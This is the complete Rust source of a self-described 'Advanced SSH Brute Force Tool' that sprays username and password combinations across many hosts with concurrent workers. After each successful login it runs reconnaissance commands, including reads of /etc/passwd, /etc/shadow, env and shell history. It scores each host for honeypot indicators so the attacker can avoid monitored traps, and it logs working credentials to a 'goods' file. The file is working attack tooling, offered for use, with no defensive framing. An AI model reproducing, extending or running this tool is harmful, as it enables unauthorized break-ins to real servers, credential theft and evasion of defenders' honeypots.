use chrono::Local;
use crossbeam_channel::{bounded, Receiver, Sender};
use regex::Regex;
use ssh2::Session;
use std::collections::{HashMap, HashSet};
use std::fs::{File, OpenOptions};
use std::io::{self, BufRead, BufReader, IsTerminal, Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicI64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

const VERSION: &str = "2.9";
const CONCURRENT_PER_WORKER: usize = 1;

// ---------------------------------------------------------------------------
// Win32 FFI (legacy fallback — Windows 2012 / 7)
// ---------------------------------------------------------------------------
#[cfg(target_os = "windows")]
mod winsys {
    use std::ffi::c_void;

    #[repr(C)]
    #[derive(Clone, Copy, Default)]
    pub struct COORD {
        pub x: i16,
        pub y: i16,
    }

    #[repr(C)]
    #[derive(Clone, Copy, Default)]
    #[allow(dead_code)]
    pub struct SMALL_RECT {
        pub left: i16,
        pub top: i16,
        pub right: i16,
        pub bottom: i16,
    }

    #[repr(C)]
    #[derive(Clone, Copy, Default)]
    #[allow(dead_code)]
    pub struct CONSOLE_SCREEN_BUFFER_INFO {
        pub dw_size: COORD,
        pub dw_cursor_position: COORD,
        pub w_attributes: u16,
        pub sr_window: SMALL_RECT,
        pub dw_maximum_window_size: COORD,
    }

    pub const STD_OUTPUT_HANDLE: u32 = 0xFFFF_FFF5u32;
    pub const ENABLE_VIRTUAL_TERMINAL_PROCESSING: u32 = 0x0004;

    #[link(name = "kernel32")]
    extern "system" {
        pub fn GetStdHandle(n: u32) -> *mut c_void;
        pub fn GetConsoleMode(h: *mut c_void, m: *mut u32) -> i32;
        pub fn SetConsoleMode(h: *mut c_void, m: u32) -> i32;
        pub fn SetConsoleCursorPosition(h: *mut c_void, c: COORD) -> i32;
        pub fn GetConsoleScreenBufferInfo(
            h: *mut c_void,
            info: *mut CONSOLE_SCREEN_BUFFER_INFO,
        ) -> i32;
        pub fn FillConsoleOutputCharacterA(
            h: *mut c_void,
            c: u8,
            n: u32,
            coord: COORD,
            written: *mut u32,
        ) -> i32;
    }
}

// ---------------------------------------------------------------------------
// Cross-platform screen renderer
// ---------------------------------------------------------------------------
struct Screen {
    #[cfg(target_os = "windows")]
    handle: usize,
    vt: bool,
    console: bool,
}

impl Screen {
    fn new() -> Self {
        let console = io::stdout().is_terminal();

        #[cfg(target_os = "windows")]
        {
            use winsys::*;
            if !console {
                return Self { handle: 0, vt: false, console: false };
            }
            unsafe {
                let handle = GetStdHandle(STD_OUTPUT_HANDLE);
                let h = handle as usize;
                let mut mode = 0u32;
                if GetConsoleMode(handle, &mut mode) == 0 {
                    return Self { handle: h, vt: false, console: true };
                }
                if SetConsoleMode(handle, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING) == 0 {
                    return Self { handle: h, vt: false, console: true };
                }
                Self { handle: h, vt: true, console: true }
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            Self { vt: console, console }
        }
    }

    fn is_dumb(&self) -> bool { !self.console }

    fn hide_cursor(&self) {
        if self.vt {
            print!("\x1b[?25l");
            let _ = io::stdout().flush();
        }
    }

    fn show_cursor(&self) {
        if self.vt {
            print!("\x1b[?25h");
            let _ = io::stdout().flush();
        }
    }

    fn clear(&self) {
        if !self.console { return; }
        if self.vt {
            print!("\x1b[2J\x1b[H");
            let _ = io::stdout().flush();
            return;
        }
        #[cfg(target_os = "windows")]
        unsafe {
            use winsys::*;
            let handle = self.handle as *mut std::ffi::c_void;
            let _ = SetConsoleCursorPosition(handle, COORD { x: 0, y: 0 });
            let mut info = CONSOLE_SCREEN_BUFFER_INFO::default();
            if GetConsoleScreenBufferInfo(handle, &mut info) != 0 {
                let w = info.dw_size.x.max(1) as u32;
                let h = info.dw_size.y.max(1) as u32;
                let mut written = 0u32;
                FillConsoleOutputCharacterA(handle, b' ', w * h, COORD { x: 0, y: 0 }, &mut written);
                SetConsoleCursorPosition(handle, COORD { x: 0, y: 0 });
            }
            let _ = io::stdout().flush();
        }
    }

    fn render(&self, frame: &str) {
        if !self.console {
            print!("{}", frame);
            let _ = io::stdout().flush();
            return;
        }
        if self.vt {
            print!("\x1b[H{}\x1b[J", frame);
            let _ = io::stdout().flush();
            return;
        }
        #[cfg(target_os = "windows")]
        unsafe {
            use winsys::*;
            let handle = self.handle as *mut std::ffi::c_void;
            let _ = SetConsoleCursorPosition(handle, COORD { x: 0, y: 0 });
            print!("{}", frame);
            let _ = io::stdout().flush();

            let mut info = CONSOLE_SCREEN_BUFFER_INFO::default();
            if GetConsoleScreenBufferInfo(handle, &mut info) != 0 {
                let w = info.dw_size.x.max(1) as u32;
                let h = info.dw_size.y.max(1) as u32;
                let cur = info.dw_cursor_position;
                let cx = if cur.x < 0 { 0 } else { cur.x as u32 };
                let cy = if cur.y < 0 { 0 } else { cur.y as u32 };
                let offset = cy * w + cx;
                let total = w * h;
                if offset < total {
                    let mut written = 0u32;
                    FillConsoleOutputCharacterA(handle, b' ', total - offset, cur, &mut written);
                }
            }
            let _ = io::stdout().flush();
        }
        #[cfg(not(target_os = "windows"))]
        {
            print!("{}", frame);
            let _ = io::stdout().flush();
        }
    }
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------
struct Stats {
    goods: AtomicI64,
    errors: AtomicI64,
    honeypots: AtomicI64,
    last_success: Mutex<String>,
    last_honeypot: Mutex<String>,
}

impl Stats {
    fn new() -> Self {
        Self {
            goods: AtomicI64::new(0),
            errors: AtomicI64::new(0),
            honeypots: AtomicI64::new(0),
            last_success: Mutex::new(String::new()),
            last_honeypot: Mutex::new(String::new()),
        }
    }
}

#[derive(Clone)]
struct SshTask {
    ip: String,
    port: String,
    username: String,
    password: String,
}

struct ServerInfo {
    ip: String,
    port: String,
    username: String,
    password: String,
    is_honeypot: bool,
    honeypot_score: i32,
    ssh_version: String,
    os_info: String,
    hostname: String,
    response_time: Duration,
    commands: HashMap<String, String>,
    open_ports: Vec<String>,
}

struct HoneypotDetector {
    time_analysis: bool,
    #[allow(dead_code)]
    command_analysis: bool,
    network_analysis: bool,
}

// ---------------------------------------------------------------------------
// Output paths — all output files live under one dir
// ---------------------------------------------------------------------------
#[derive(Clone)]
struct OutputPaths {
    combo: PathBuf,
    goods: PathBuf,
    detailed: PathBuf,
    honeypots: PathBuf,
}

impl OutputPaths {
    fn new(dir: &Path) -> Self {
        Self {
            combo: dir.join("combo.txt"),
            goods: dir.join("su-goods.txt"),
            detailed: dir.join("detailed-results.txt"),
            honeypots: dir.join("honeypots.txt"),
        }
    }
}

// ---------------------------------------------------------------------------
// CLI args
// ---------------------------------------------------------------------------
#[derive(Default)]
struct Cli {
    user_file: Option<String>,
    pass_file: Option<String>,
    ip_file: Option<String>,
    output_dir: Option<String>,
    timeout: Option<u64>,
    workers: Option<usize>,
}

fn print_help() {
    let prog = std::env::args().next().unwrap_or_else(|| "sshscan".into());
    println!("Advanced SSH Brute Force Tool v{}", VERSION);
    println!();
    println!("USAGE:");
    println!("  {} [OPTIONS] [USER_FILE]", prog);
    println!();
    println!("OPTIONS:");
    println!("  -u, --user   <FILE>   Username list file (one per line)");
    println!("  -p, --pass   <FILE>   Password list file (one per line)");
    println!("  -i, --ip     <FILE>   IP list file (ip:port per line)");
    println!("  -o, --output <DIR>    Output directory for combo.txt, su-goods.txt,");
    println!("                        detailed-results.txt, honeypots.txt");
    println!("                        (default: current directory)");
    println!("  -t, --timeout <SECS>  Connection timeout (default: prompt)");
    println!("  -w, --workers <N>     Max concurrent workers (default: prompt)");
    println!("  -h, --help            Show this help");
    println!();
    println!("EXAMPLES:");
    println!("  {} users.txt", prog);
    println!("  {} -u users.txt -p pass.txt -o results/run1", prog);
    println!("  {} -u users.txt -p pass.txt -i ips.txt -o out -t 8 -w 50", prog);
    println!();
    println!("Missing options are prompted interactively.");
}

fn parse_cli() -> Cli {
    let mut cli = Cli::default();
    let mut args = std::env::args().skip(1);
    let mut positional_used = false;

    while let Some(arg) = args.next() {
        match arg.as_str() {
            "-u" | "--user" => cli.user_file = args.next(),
            "-p" | "--pass" => cli.pass_file = args.next(),
            "-i" | "--ip" => cli.ip_file = args.next(),
            "-o" | "--output" => cli.output_dir = args.next(),
            "-t" | "--timeout" => cli.timeout = args.next().and_then(|s| s.parse().ok()),
            "-w" | "--workers" => cli.workers = args.next().and_then(|s| s.parse().ok()),
            "-h" | "--help" => {
                print_help();
                std::process::exit(0);
            }
            s if !s.starts_with('-') && !positional_used => {
                cli.user_file = Some(s.to_string());
                positional_used = true;
            }
            other => {
                eprintln!("⚠️  Unknown arg ignored: {}", other);
            }
        }
    }
    cli
}

// ---------------------------------------------------------------------------
// Output dir resolver
// ---------------------------------------------------------------------------
fn resolve_output_dir(given: Option<&str>) -> PathBuf {
    let dir = given
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("."));

    if dir.exists() {
        if dir.is_dir() {
            println!("✔️  Output dir: {}", dir.display());
            return dir;
        }
        eprintln!("❌ Not a directory: {}", dir.display());
        eprintln!("   Falling back to current directory.");
        return PathBuf::from(".");
    }

    if let Err(e) = std::fs::create_dir_all(&dir) {
        eprintln!("❌ Cannot create output dir {}: {}", dir.display(), e);
        eprintln!("   Falling back to current directory.");
        return PathBuf::from(".");
    }
    println!("✔️  Created output dir: {}", dir.display());
    dir
}

// ---------------------------------------------------------------------------
// Input helpers
// ---------------------------------------------------------------------------
fn prompt<R: BufRead>(reader: &mut R, msg: &str) -> String {
    print!("{}", msg);
    let _ = io::stdout().flush();
    let mut s = String::new();
    reader.read_line(&mut s).ok();
    s.trim().to_string()
}

fn file_exists<P: AsRef<Path>>(path: P) -> bool {
    path.as_ref().exists()
}

fn resolve_file<R: BufRead>(reader: &mut R, given: Option<String>, label: &str) -> String {
    if let Some(f) = given {
        if file_exists(&f) {
            println!("✔️  {} file: {}", label, f);
            return f;
        }
        eprintln!("❌ {} file not found: {}", label, f);
    }
    loop {
        let p = prompt(reader, &format!("Enter the {} list file path: ", label));
        if file_exists(&p) {
            return p;
        }
        eprintln!("❌ File not found: {}, try again.", p);
    }
}

fn resolve_num<R: BufRead, T>(reader: &mut R, given: Option<T>, label: &str) -> T
where
    T: std::str::FromStr + PartialOrd + Default + Copy + std::fmt::Display,
{
    if let Some(v) = given {
        if v > T::default() {
            println!("✔️  {}: {}", label, v);
            return v;
        }
    }
    loop {
        let s = prompt(reader, &format!("Enter the {}: ", label));
        match s.parse::<T>() {
            Ok(v) if v > T::default() => return v,
            _ => eprintln!("❌ Invalid number, try again."),
        }
    }
}

fn get_items<P: AsRef<Path>>(path: P) -> Vec<Vec<String>> {
    let path = path.as_ref();
    let file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to open {}: {}", path.display(), e);
            std::process::exit(1);
        }
    };
    let reader = BufReader::new(file);
    let mut items = Vec::new();
    for line in reader.lines().flatten() {
        if !line.is_empty() {
            items.push(line.split(':').map(|s| s.to_string()).collect());
        }
    }
    items
}

fn append_to_file<P: AsRef<Path>>(data: &str, path: P) {
    let path = path.as_ref();
    match OpenOptions::new().append(true).create(true).open(path) {
        Ok(mut f) => {
            if let Err(e) = f.write_all(data.as_bytes()) {
                eprintln!("Failed to write {}: {}", path.display(), e);
            }
        }
        Err(e) => eprintln!("Failed to open {} for append: {}", path.display(), e),
    }
}

// ---------------------------------------------------------------------------
// Combo builder
// ---------------------------------------------------------------------------
fn build_combo<R: BufRead>(reader: &mut R, cli: &Cli, outputs: &OutputPaths) {
    let from_cli = cli.user_file.is_some() || cli.pass_file.is_some();

    if !from_cli && outputs.combo.exists() {
        let ans = prompt(
            reader,
            &format!("{} exists. Reuse it? (y/n): ", outputs.combo.display()),
        );
        if ans.eq_ignore_ascii_case("y") || ans.eq_ignore_ascii_case("yes") {
            println!("✔️  Using existing {}", outputs.combo.display());
            return;
        }
    }

    let ufile = resolve_file(reader, cli.user_file.clone(), "username");
    let pfile = resolve_file(reader, cli.pass_file.clone(), "password");

    let usernames = get_items(&ufile);
    let passwords = get_items(&pfile);

    let mut file = match File::create(&outputs.combo) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to create {}: {}", outputs.combo.display(), e);
            std::process::exit(1);
        }
    };

    let mut count = 0u64;
    for username in &usernames {
        for password in &passwords {
            if !username.is_empty() && !password.is_empty() {
                if writeln!(file, "{}:{}", username[0], password[0]).is_ok() {
                    count += 1;
                }
            }
        }
    }
    println!(
        "✔️  {} created with {} entries",
        outputs.combo.display(),
        count
    );
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------
fn main() {
    let cli = parse_cli();
    let screen = Screen::new();
    let mut reader = io::stdin().lock();

    let output_dir = resolve_output_dir(cli.output_dir.as_deref());
    let outputs = Arc::new(OutputPaths::new(&output_dir));

    build_combo(&mut reader, &cli, &outputs);

    let ip_file = resolve_file(&mut reader, cli.ip_file.clone(), "IP");
    let timeout: u64 = resolve_num(&mut reader, cli.timeout, "timeout value (seconds)");
    let max_workers: usize =
        resolve_num(&mut reader, cli.workers, "maximum number of workers");

    let start_time = Instant::now();

    let combos = get_items(&outputs.combo);
    let ips = get_items(&ip_file);
    let total_ip_count = ips.len().saturating_mul(combos.len());

    let stats = Arc::new(Stats::new());
    let successful_ips: Arc<Mutex<HashSet<String>>> = Arc::new(Mutex::new(HashSet::new()));

    setup_enhanced_worker_pool(
        screen,
        combos,
        ips,
        max_workers,
        timeout,
        stats,
        successful_ips,
        outputs,
        ip_file,
        total_ip_count,
        start_time,
    );

    println!("Operation completed successfully!");
}

// ---------------------------------------------------------------------------
// SSH plumbing
// ---------------------------------------------------------------------------
fn ssh_connect(
    ip: &str,
    port: &str,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Option<Session> {
    let addr = format!("{}:{}", ip, port);
    let sockaddr = addr.to_socket_addrs().ok()?.next()?;
    let timeout = Duration::from_secs(timeout_secs.max(1));
    let tcp = TcpStream::connect_timeout(&sockaddr, timeout).ok()?;
    tcp.set_read_timeout(Some(timeout)).ok()?;
    tcp.set_write_timeout(Some(timeout)).ok()?;

    let mut sess = Session::new().ok()?;
    sess.set_tcp_stream(tcp);
    sess.set_timeout(timeout_secs as u32 * 1000);
    sess.handshake().ok()?;
    sess.userauth_password(username, password).ok()?;

    if sess.authenticated() { Some(sess) } else { None }
}

fn execute_command(sess: &Session, command: &str) -> String {
    let mut channel = match sess.channel_session() {
        Ok(c) => c,
        Err(e) => return format!("ERROR: {}", e),
    };
    if let Err(e) = channel.exec(command) {
        return format!("ERROR: {}", e);
    }

    let mut stdout = String::new();
    let _ = channel.read_to_string(&mut stdout);

    let mut stderr = String::new();
    {
        let mut stderr_stream = channel.stderr();
        let _ = stderr_stream.read_to_string(&mut stderr);
    }

    if stderr.is_empty() { stdout } else { format!("{}{}", stdout, stderr) }
}

// ---------------------------------------------------------------------------
// System info gathering
// ---------------------------------------------------------------------------
fn gather_system_info(sess: &Session, server_info: &mut ServerInfo) {
    let commands: [(&str, &str); 12] = [
        ("hostname", "hostname"),
        ("uname", "uname -a"),
        ("whoami", "whoami"),
        ("pwd", "pwd"),
        ("ls_root", "ls -la /"),
        ("ps", "ps aux | head -10"),
        ("netstat", "netstat -tulpn | head -10"),
        ("history", "history | tail -5"),
        ("ssh_version", "ssh -V"),
        ("uptime", "uptime"),
        ("mount", "mount | head -5"),
        ("env", "env | head -10"),
    ];

    for (name, cmd) in commands.iter() {
        let output = execute_command(sess, cmd);
        server_info.commands.insert(name.to_string(), output.clone());

        match *name {
            "hostname" => server_info.hostname = output.trim().to_string(),
            "uname" => server_info.os_info = output.trim().to_string(),
            "ssh_version" => server_info.ssh_version = output.trim().to_string(),
            _ => {}
        }
    }

    server_info.open_ports = scan_local_ports(sess);
}

fn scan_local_ports(sess: &Session) -> Vec<String> {
    let output = execute_command(sess, "netstat -tulpn 2>/dev/null | grep LISTEN | head -20");
    let mut ports: Vec<String> = Vec::new();
    let re = Regex::new(r":(\d+)\s").unwrap();

    for line in output.lines() {
        for cap in re.captures_iter(line) {
            if let Some(p) = cap.get(1) {
                let s = p.as_str().to_string();
                if !ports.contains(&s) {
                    ports.push(s);
                }
            }
        }
    }
    ports
}

// ---------------------------------------------------------------------------
// Honeypot detection
// ---------------------------------------------------------------------------
fn detect_honeypot(
    sess: &Session,
    server_info: &mut ServerInfo,
    detector: &HoneypotDetector,
) -> bool {
    let mut score = 0;

    score += analyze_command_output(server_info);
    if detector.time_analysis {
        score += analyze_response_time(server_info);
    }
    score += analyze_file_system(server_info);
    score += analyze_processes(server_info);
    if detector.network_analysis {
        score += analyze_network(sess);
    }
    score += behavioral_tests(sess, server_info);
    score += detect_anomalies(server_info);
    score += advanced_honeypot_tests(sess);
    score += performance_tests(sess);

    server_info.honeypot_score = score;
    score >= 6
}

fn analyze_command_output(server_info: &ServerInfo) -> i32 {
    let mut score = 0;
    let indicators = [
        "fake", "simulation", "honeypot", "trap", "monitor",
        "cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
        "/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
    ];
    for output in server_info.commands.values() {
        let lower = output.to_lowercase();
        for ind in indicators.iter() {
            if lower.contains(ind) { score += 3; }
        }
    }
    score
}

fn analyze_response_time(server_info: &ServerInfo) -> i32 {
    if server_info.response_time.as_millis() < 10 { 2 } else { 0 }
}

fn analyze_file_system(server_info: &ServerInfo) -> i32 {
    let mut score = 0;
    let ls_output = match server_info.commands.get("ls_root") {
        Some(o) => o,
        None => return 0,
    };
    let suspicious = ["total 0", "total 4", "honeypot", "fake", "simulation"];
    let lower = ls_output.to_lowercase();
    for p in suspicious.iter() {
        if lower.contains(p) { score += 1; }
    }
    if ls_output.trim().lines().count() < 5 { score += 1; }
    score
}

fn analyze_processes(server_info: &ServerInfo) -> i32 {
    let mut score = 0;
    let ps_output = match server_info.commands.get("ps") {
        Some(o) => o,
        None => return 0,
    };
    let suspicious = [
        "cowrie", "kippo", "honeypot", "honeyd",
        "artillery", "honeytrap", "glastopf",
        "python honeypot", "perl honeypot",
    ];
    let lower = ps_output.to_lowercase();
    for p in suspicious.iter() {
        if lower.contains(p) { score += 2; }
    }
    if ps_output.trim().lines().count() < 5 { score += 1; }
    score
}

fn analyze_network(sess: &Session) -> i32 {
    let mut score = 0;

    let cfg = execute_command(
        sess,
        "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5",
    );
    let cl = cfg.to_lowercase();
    if cl.contains("total 0") || cl.contains("no such file") || cfg.trim().len() < 10 {
        score += 1;
    }

    let iface = execute_command(sess, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5");
    let il = iface.to_lowercase();
    if il.contains("fake") || il.contains("honeypot") || il.contains("trap") || iface.trim().len() < 10 {
        score += 1;
    }

    let route = execute_command(sess, "ip route show 2>/dev/null | head -3");
    if route.trim().len() < 20 { score += 1; }
    score
}

fn behavioral_tests(sess: &Session, _server_info: &mut ServerInfo) -> i32 {
    let mut score = 0;

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let tmp = format!("/tmp/test_{}", ts);
    let out = execute_command(sess, &format!("echo 'test' > {}", tmp));
    let lower = out.to_lowercase();
    if lower.contains("error") || lower.contains("permission denied") {
        score += 1;
    } else {
        execute_command(sess, &format!("rm -f {}", tmp));
    }

    let sensitive = ["/etc/passwd", "/etc/shadow", "/proc/version"];
    let mut accessible = 0;
    for f in sensitive.iter() {
        let o = execute_command(sess, &format!("cat {} 2>/dev/null | head -1", f));
        if !o.to_lowercase().contains("error") && !o.is_empty() {
            accessible += 1;
        }
    }
    if accessible == sensitive.len() { score += 1; }

    let cmds = ["id", "whoami", "pwd"];
    let mut working = 0;
    for c in cmds.iter() {
        let o = execute_command(sess, c);
        if !o.to_lowercase().contains("error") && !o.is_empty() {
            working += 1;
        }
    }
    if working == 0 { score += 2; }
    score
}

fn advanced_honeypot_tests(sess: &Session) -> i32 {
    let mut score = 0;

    let cpu = execute_command(sess, "cat /proc/cpuinfo | grep 'model name' | head -1");
    let cl = cpu.to_lowercase();
    if cl.contains("qemu") || cl.contains("virtual") { score += 1; }

    let kernel = execute_command(sess, "uname -r");
    if kernel.contains("generic") && kernel.trim().len() < 20 { score += 1; }

    let pms = ["which apt", "which yum", "which pacman", "which zypper"];
    let mut working_pms = 0;
    for pm in pms.iter() {
        let o = execute_command(sess, pm);
        if !o.contains("not found") && !o.trim().is_empty() {
            working_pms += 1;
        }
    }
    if working_pms == 0 { score += 1; }

    let services = execute_command(
        sess,
        "systemctl list-units --type=service --state=running 2>/dev/null | head -10",
    );
    if services.contains("0 loaded units") || services.trim().len() < 50 { score += 1; }

    let net = execute_command(sess, "ping -c 1 8.8.8.8 2>/dev/null | grep '1 packets transmitted'");
    if net.trim().is_empty() { score += 1; }

    score
}

fn performance_tests(sess: &Session) -> i32 {
    let mut score = 0;
    let io = execute_command(sess, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1");
    if io.contains("command not found") { score += 1; }
    execute_command(sess, "rm -f /tmp/test");

    let net = execute_command(sess, "ss -tuln 2>/dev/null | wc -l");
    if !net.is_empty() {
        if let Ok(count) = net.trim().parse::<i32>() {
            if count < 5 { score += 1; }
        }
    }
    score
}

fn detect_anomalies(server_info: &ServerInfo) -> i32 {
    let mut score = 0;

    if !server_info.hostname.is_empty() {
        let suspicious = [
            "honeypot", "fake", "trap", "monitor", "sandbox",
            "test", "simulation", "gnu/linux", "preempt_dynamic",
        ];
        let h = server_info.hostname.to_lowercase();
        for s in suspicious.iter() {
            if h.contains(s) { score += 1; }
        }
    }

    if let Some(u) = server_info.commands.get("uptime") {
        if u.contains("0:") || u.contains("min") || u.contains("command not found") {
            score += 1;
        }
    }

    if let Some(h) = server_info.commands.get("history") {
        if h.trim().lines().count() < 3 { score += 1; }
    }
    score
}

// ---------------------------------------------------------------------------
// Logging
// ---------------------------------------------------------------------------
fn log_successful_connection(info: &ServerInfo, outputs: &OutputPaths) {
    let msg = format!("{}:{}@{}:{}", info.ip, info.port, info.username, info.password);
    append_to_file(&format!("{}\n", msg), &outputs.goods);

    let detailed = format!(
        "\n=== SSH Success ===\n🌐 Target: {}:{}\n🔑 Credentials: {}:{}\n🖥️ Hostname: {}\n🐧 OS: {}\n📡 SSH Version: {}\n⚡ Response Time: {:?}\n🍯 Honeypot Score: {}\n🕒 Timestamp: {}\n========================\n",
        info.ip, info.port,
        info.username, info.password,
        info.hostname,
        info.os_info,
        info.ssh_version,
        info.response_time,
        info.honeypot_score,
        Local::now().format("%Y-%m-%d %H:%M:%S"),
    );
    append_to_file(&detailed, &outputs.detailed);
}

// ---------------------------------------------------------------------------
// Banner
// ---------------------------------------------------------------------------
fn format_time(seconds: f64) -> String {
    let t = seconds as u64;
    let days = t / 86400;
    let hours = (t % 86400) / 3600;
    let minutes = (t % 3600) / 60;
    let secs = t % 60;
    format!("{:02}:{:02}:{:02}:{:02}", days, hours, minutes, secs)
}

fn banner(
    screen: Screen,
    stats: Arc<Stats>,
    ip_file: String,
    output_dir: PathBuf,
    timeout: u64,
    max_workers: usize,
    total_ip_count: usize,
    start_time: Instant,
    stop_flag: Arc<AtomicBool>,
) {
    screen.hide_cursor();
    screen.clear();

    let dumb = screen.is_dumb();
    let mut tick: u64 = 0;

    loop {
        thread::sleep(Duration::from_millis(500));
        tick += 1;

        let goods = stats.goods.load(Ordering::Relaxed);
        let errors = stats.errors.load(Ordering::Relaxed);
        let honeypots = stats.honeypots.load(Ordering::Relaxed);

        let total_connections = (goods + errors + honeypots) as usize;
        let elapsed = start_time.elapsed().as_secs_f64();
        let cps = if elapsed > 0.0 { total_connections as f64 / elapsed } else { 0.0 };
        let remaining = if cps > 0.0 {
            (total_ip_count as f64 - total_connections as f64) / cps
        } else { 0.0 };

        let last_success = stats.last_success.lock().map(|s| s.clone()).unwrap_or_default();
        let last_honeypot = stats.last_honeypot.lock().map(|s| s.clone()).unwrap_or_default();

        let finished = stop_flag.load(Ordering::Relaxed) || total_connections >= total_ip_count;

        if dumb && tick % 10 != 0 && !finished {
            continue;
        }

        let mut frame = String::with_capacity(1700);
        macro_rules! ln {
            ($($arg:tt)*) => {{
                frame.push_str(&format!($($arg)*));
                frame.push('\n');
            }};
        }

        ln!("==========================================");
        ln!("🚀 Advanced SSH Brute Force Tool v{} 🚀", VERSION);
        ln!("==========================================");
        ln!("📁 IP File: {} | ⏱️  Timeout: {}s", ip_file, timeout);
        ln!("📂 Output:  {}", output_dir.display());
        ln!("🔗 Max Workers: {} | Per Worker: {}", max_workers, CONCURRENT_PER_WORKER);
        ln!("==========================================");
        ln!("🔍 Checked SSH: {}/{}", total_connections, total_ip_count);
        ln!("⚡ Speed: {:.2} checks/sec", cps);

        if total_connections < total_ip_count {
            ln!("⏳ Elapsed: {}", format_time(elapsed));
            ln!("⏰ Remaining: {}", format_time(remaining));
            ln!("==========================================");
        } else {
            ln!("⏳ Total Time: {}", format_time(elapsed));
            ln!("✅ Scan Completed Successfully!");
            ln!("==========================================");
        }

        ln!("✅ Successful: {}", goods);
        ln!("❌ Failed: {}", errors);
        ln!("🍯 Honeypots: {}", honeypots);
        ln!("==========================================");

        if total_connections > 0 {
            let succ = goods + honeypots;
            if succ > 0 {
                ln!("📊 Success Rate: {:.2}%", goods as f64 / succ as f64 * 100.0);
                ln!("🍯 Honeypot Rate: {:.2}%", honeypots as f64 / succ as f64 * 100.0);
            }
        }

        if !last_success.is_empty() { ln!("🌟 Last: {}", last_success); }
        if !last_honeypot.is_empty() { ln!("🎯 Last HP: {}", last_honeypot); }

        screen.render(&frame);

        if finished { break; }
    }

    screen.show_cursor();
    println!();
}

// ---------------------------------------------------------------------------
// Worker pool
// ---------------------------------------------------------------------------
fn calculate_optimal_buffers(max_workers: usize) -> usize {
    ((max_workers * CONCURRENT_PER_WORKER) as f64 * 1.5) as usize
}

#[allow(clippy::too_many_arguments)]
fn setup_enhanced_worker_pool(
    screen: Screen,
    combos: Vec<Vec<String>>,
    ips: Vec<Vec<String>>,
    max_workers: usize,
    timeout: u64,
    stats: Arc<Stats>,
    successful_ips: Arc<Mutex<HashSet<String>>>,
    outputs: Arc<OutputPaths>,
    ip_file: String,
    total_ip_count: usize,
    start_time: Instant,
) {
    let buffer = calculate_optimal_buffers(max_workers);
    let (tx, rx): (Sender<SshTask>, Receiver<SshTask>) = bounded(buffer);

    let stop_flag = Arc::new(AtomicBool::new(false));

    // Derive output dir path for banner display
    let output_dir = outputs
        .combo
        .parent()
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| PathBuf::from("."));

    let banner_stats = stats.clone();
    let banner_stop = stop_flag.clone();
    let banner_handle = thread::spawn(move || {
        banner(
            screen,
            banner_stats,
            ip_file,
            output_dir,
            timeout,
            max_workers,
            total_ip_count,
            start_time,
            banner_stop,
        );
    });

    let mut worker_handles = Vec::new();
    for _ in 0..max_workers {
        let rx = rx.clone();
        let stats = stats.clone();
        let successful_ips = successful_ips.clone();
        let outputs = outputs.clone();
        worker_handles.push(thread::spawn(move || {
            while let Ok(task) = rx.recv() {
                process_ssh_task(task, &stats, &successful_ips, &outputs, timeout);
            }
        }));
    }
    drop(rx);

    let producer = thread::spawn(move || {
        for combo in combos.iter() {
            for ip in ips.iter() {
                if ip.len() < 2 || combo.len() < 2 { continue; }
                let task = SshTask {
                    ip: ip[0].clone(),
                    port: ip[1].clone(),
                    username: combo[0].clone(),
                    password: combo[1].clone(),
                };
                if tx.send(task).is_err() { return; }
            }
        }
    });

    for h in worker_handles { let _ = h.join(); }
    let _ = producer.join();

    stop_flag.store(true, Ordering::Relaxed);
    let _ = banner_handle.join();
}

fn process_ssh_task(
    task: SshTask,
    stats: &Arc<Stats>,
    successful_ips: &Arc<Mutex<HashSet<String>>>,
    outputs: &OutputPaths,
    timeout: u64,
) {
    let connection_start = Instant::now();

    if let Some(sess) = ssh_connect(&task.ip, &task.port, &task.username, &task.password, timeout) {
        let mut info = ServerInfo {
            ip: task.ip.clone(),
            port: task.port.clone(),
            username: task.username.clone(),
            password: task.password.clone(),
            is_honeypot: false,
            honeypot_score: 0,
            ssh_version: String::new(),
            os_info: String::new(),
            hostname: String::new(),
            response_time: connection_start.elapsed(),
            commands: HashMap::new(),
            open_ports: Vec::new(),
        };

        let detector = HoneypotDetector {
            time_analysis: true,
            command_analysis: true,
            network_analysis: true,
        };

        gather_system_info(&sess, &mut info);
        info.is_honeypot = detect_honeypot(&sess, &mut info, &detector);

        let key = format!("{}:{}", info.ip, info.port);
        let already_seen = {
            let mut ips = successful_ips.lock().unwrap();
            if ips.contains(&key) {
                true
            } else {
                ips.insert(key);
                false
            }
        };

        if !already_seen {
            if !info.is_honeypot {
                stats.goods.fetch_add(1, Ordering::Relaxed);
                if let Ok(mut slot) = stats.last_success.lock() {
                    *slot = format!(
                        "{}:{} @ {}:{}",
                        info.ip, info.port, info.username, info.password
                    );
                }
                log_successful_connection(&info, outputs);
            } else {
                stats.honeypots.fetch_add(1, Ordering::Relaxed);
                if let Ok(mut slot) = stats.last_honeypot.lock() {
                    *slot = format!("{}:{} (score {})", info.ip, info.port, info.honeypot_score);
                }
                append_to_file(
                    &format!(
                        "HONEYPOT: {}:{}@{}:{} (Score: {})\n",
                        info.ip, info.port, info.username, info.password, info.honeypot_score
                    ),
                    &outputs.honeypots,
                );
            }
        }
    } else {
        stats.errors.fetch_add(1, Ordering::Relaxed);
    }
}
